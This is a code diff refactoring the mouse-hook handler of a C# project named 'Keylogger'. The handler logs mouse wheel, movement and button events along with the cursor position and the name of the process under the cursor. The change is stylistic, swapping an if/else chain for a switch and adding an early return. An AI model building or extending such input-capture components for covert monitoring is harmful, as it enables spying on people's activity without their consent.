@@ -24,19 +24,21 @@ namespace Keylogger.Hooks
             var position = $"(X:{mouseStruct.pt.x}, Y:{mouseStruct.pt.y})";
             var processName = GetProcessNameFromPoint(mouseStruct.pt);
 
-            if ((MouseMessage)wParam == MouseMessage.WM_MOUSEWHEEL)
+            switch ((MouseMessage)wParam)
             {
-                var wheelDelta = (short)((mouseStruct.mouseData >> 16) & 0xffff);
-                var wheelDirection = wheelDelta > 0 ? "[Wheel Forward]" : "[Wheel Backward]";
-                LogMouseButtonsCallback?.Invoke(wheelDirection, position, processName);
-            }
-            else if ((MouseMessage)wParam == MouseMessage.WM_MOUSEMOVE)
-            {
-                LogMousePositionCallback?.Invoke($"[{GetMouseMessageName(wParam)}]", position, processName);
-            }
-            else
-            {
-                LogMouseButtonsCallback?.Invoke($"[{GetMouseMessageName(wParam)}]", position, processName);
+                case MouseMessage.WM_MOUSEWHEEL:
+                {
+                    var wheelDelta = (short)((mouseStruct.mouseData >> 16) & 0xffff);
+                    var wheelDirection = wheelDelta > 0 ? "[Wheel Forward]" : "[Wheel Backward]";
+                    LogMouseButtonsCallback?.Invoke(wheelDirection, position, processName);
+                    break;
+                }
+                case MouseMessage.WM_MOUSEMOVE:
+                    LogMousePositionCallback?.Invoke($"[{GetMouseMessageName(wParam)}]", position, processName);
+                    break;
+                default:
+                    LogMouseButtonsCallback?.Invoke($"[{GetMouseMessageName(wParam)}]", position, processName);
+                    break;
             }
 
             return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
@@ -45,23 +47,21 @@ namespace Keylogger.Hooks
         private static string GetProcessNameFromPoint(POINT point)
         {
             var hWnd = WindowFromPoint(point);
-            if (hWnd != IntPtr.Zero)
+            if (hWnd == IntPtr.Zero) return string.Empty;
+            
+            var processIdPtr = Marshal.AllocHGlobal(sizeof(uint));
+            try
             {
-                var processIdPtr = Marshal.AllocHGlobal(sizeof(uint));
-                try
-                {
-                    _ = GetWindowThreadProcessId(hWnd, processIdPtr);
-                    uint processId = (uint)Marshal.ReadInt32(processIdPtr);
-                    // Obtener el nombre del proceso
-                    var process = Process.GetProcessById((int)processId);
-                    return process.ProcessName;
-                }
-                finally
-                {
-                    Marshal.FreeHGlobal(processIdPtr);
-                }
+                _ = GetWindowThreadProcessId(hWnd, processIdPtr);
+                var processId = (uint)Marshal.ReadInt32(processIdPtr);
+                // Obtener el nombre del proceso
+                var process = Process.GetProcessById((int)processId);
+                return process.ProcessName;
             }
-            return string.Empty;
+            finally
+            {
+                Marshal.FreeHGlobal(processIdPtr);
+            }
         }
     }
 }
